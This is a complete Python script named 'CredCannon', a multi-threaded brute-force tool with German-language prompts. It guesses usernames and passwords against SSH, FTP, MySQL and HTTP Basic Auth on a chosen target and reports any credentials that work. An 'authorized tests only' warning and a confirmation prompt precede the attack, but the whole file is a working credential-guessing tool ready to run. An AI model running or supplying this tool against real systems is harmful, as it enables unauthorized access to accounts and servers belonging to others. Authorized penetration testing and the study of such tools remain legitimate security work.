#!/usr/bin/env python3
"""
CredCannon - Multi-Protocol Brute-Force Tool
NUR FÜR AUTORISIERTE TESTS!
"""

import argparse
import socket
import paramiko
import ftplib
import sys
import threading
import time
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import mysql.connector
except ImportError:
    mysql = None

init(autoreset=True)

class CredCannon:
    def __init__(self, target, port=None, userlist=None, passlist=None, threads=50, delay=0.5):
        self.target = target
        self.port = port
        self.userlist = self.load_wordlist(userlist) if userlist else ["admin", "root", "user"]
        self.passlist = self.load_wordlist(passlist) if passlist else ["password", "123456", "admin"]
        self.threads = threads
        self.delay = delay
        self.found = []
        self.lock = threading.Lock()
    
    def load_wordlist(self, filepath):
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def print_banner(self):
        print(rf"""{Fore.RED}
   ____            _     ____                  
  / ___|_ __ _   _| |__ / ___|___  _ __   ___  
 | |   | '__| | | | '_ \ |   / _ \| '_ \ / _ \ 
 | |___| |  | |_| | |_) | |__| (_) | | | | (_) |
  \____|_|   \__,_|_.__/ \____\___/|_| |_|\___/ 
{Fore.WHITE}   >> MULTI-PROTOCOL BRUTE FORCE v1.0 <<
{Fore.YELLOW}   NUR FÜR AUTORISIERTE TESTS!
        """)
    
    # ---------- SSH ----------
    def brute_ssh(self, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port or 22, username=username, password=password, timeout=5)
            ssh.close()
            with self.lock:
                self.found.append(("SSH", username, password))
                print(f"{Fore.GREEN}[+] SSH: {username}:{password}")
            return True
        except:
            return False
    
    # ---------- FTP ----------
    def brute_ftp(self, username, password):
        try:
            ftp = ftplib.FTP(self.target)
            ftp.login(username, password)
            ftp.quit()
            with self.lock:
                self.found.append(("FTP", username, password))
                print(f"{Fore.GREEN}[+] FTP: {username}:{password}")
            return True
        except:
            return False
    
    # ---------- MySQL ----------
    def brute_mysql(self, username, password):
        try:
            conn = mysql.connector.connect(host=self.target, port=self.port or 3306, user=username, password=password, connect_timeout=5)
            conn.close()
            with self.lock:
                self.found.append(("MySQL", username, password))
                print(f"{Fore.GREEN}[+] MySQL: {username}:{password}")
            return True
        except:
            return False
    
    # ---------- HTTP Basic Auth ----------
    def brute_http(self, username, password):
        import requests
        from requests.auth import HTTPBasicAuth
        try:
            url = f"http://{self.target}"
            if self.port:
                url = f"http://{self.target}:{self.port}"
            r = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
            if r.status_code == 200:
                with self.lock:
                    self.found.append(("HTTP Basic", username, password))
                    print(f"{Fore.GREEN}[+] HTTP Basic: {username}:{password}")
                return True
        except:
            pass
        return False
    
    def run_attack(self, protocol):
        if protocol == "mysql" and mysql is None:
            print(f"{Fore.RED}[ERROR] mysql-connector-python ist nicht installiert.")
            print(f"{Fore.YELLOW}[HINWEIS] Installiere es mit: pip install mysql-connector-python")
            return

        print(f"{Fore.CYAN}[*] Starte Brute-Force auf {self.target}:{self.port or 'default'} ({protocol})")
        total = len(self.userlist) * len(self.passlist)
        count = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for user in self.userlist:
                for pwd in self.passlist:
                    if protocol == "ssh":
                        futures.append(executor.submit(self.brute_ssh, user, pwd))
                    elif protocol == "ftp":
                        futures.append(executor.submit(self.brute_ftp, user, pwd))
                    elif protocol == "mysql":
                        futures.append(executor.submit(self.brute_mysql, user, pwd))
                    elif protocol == "http":
                        futures.append(executor.submit(self.brute_http, user, pwd))
                    count += 1
                    if count % 10 == 0:
                        print(f"{Fore.WHITE}[*] Fortschritt: {count}/{total}", end="\r")
                    time.sleep(self.delay)
            
            for future in as_completed(futures):
                pass
        print(f"\n{Fore.CYAN}[*] Fertig. {len(self.found)} Credentials gefunden.")
        for cred in self.found:
            print(f"  {cred[0]}: {cred[1]} : {cred[2]}")

def main():
    parser = argparse.ArgumentParser(description="CredCannon - Brute-Force Tool")
    parser.add_argument("target", help="Ziel-IP oder Hostname")
    parser.add_argument("-p", "--port", type=int, help="Port (optional)")
    parser.add_argument("--protocol", choices=["ssh", "ftp", "mysql", "http"], required=True)
    parser.add_argument("-U", "--userlist", help="Benutzerliste")
    parser.add_argument("-P", "--passlist", help="Passwortliste")
    parser.add_argument("-t", "--threads", type=int, default=50)
    parser.add_argument("-d", "--delay", type=float, default=0.5)
    args = parser.parse_args()
    
    print(f"{Fore.RED}[!] CredCannon: Nur für autorisierte Tests!")
    confirm = input(f"{Fore.WHITE}[?] Fortfahren? (ja/NEIN): ").strip().lower()
    if confirm != "ja":
        print("Abbruch.")
        sys.exit(0)
    
    cannon = CredCannon(args.target, args.port, args.userlist, args.passlist, args.threads, args.delay)
    cannon.run_attack(args.protocol)

if __name__ == "__main__":
    main()
